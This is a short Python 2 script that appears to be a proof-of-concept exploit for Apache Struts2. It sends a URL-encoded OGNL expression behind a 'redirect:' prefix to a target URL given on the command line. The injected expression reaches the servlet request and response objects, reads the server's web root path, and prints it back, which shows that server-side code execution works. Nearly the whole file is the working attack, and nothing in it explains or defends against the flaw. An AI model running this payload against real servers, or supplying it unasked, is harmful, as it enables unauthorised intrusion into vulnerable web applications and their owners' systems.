import urllib2,sys,re

def get(url, data):
	string = url + "?" + data
	req = urllib2.Request("%s"%string)
	response = urllib2.urlopen(req).read().strip()
	print strip(response)

def strip(str):
    tmp = str.strip()
    blank_line=re.compile('\x00')
    tmp=blank_line.sub('',tmp)
    return tmp

if __name__ == '__main__':
	url = sys.argv[1]
	attack="redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D"
	get(url,attack)